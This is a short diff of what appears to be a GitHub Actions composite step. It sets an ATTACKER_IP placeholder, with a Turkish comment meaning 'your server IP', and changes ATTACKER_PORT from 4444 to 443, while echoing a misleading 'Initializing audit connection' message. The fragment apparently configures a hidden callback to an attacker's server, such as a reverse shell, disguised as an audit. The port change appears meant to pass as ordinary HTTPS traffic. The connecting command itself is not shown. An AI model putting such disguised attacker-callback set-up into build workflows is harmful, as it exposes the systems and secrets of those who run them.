@@ -9,7 +9,7 @@ runs:
       run: |
         # --- AYARLAR ---
         ATTACKER_IP="SİZİN_SERVER_IP_UNVANI"
-        ATTACKER_PORT="4444"
+        ATTACKER_PORT="443"
 
         echo "[*] Initializing audit connection..."
 
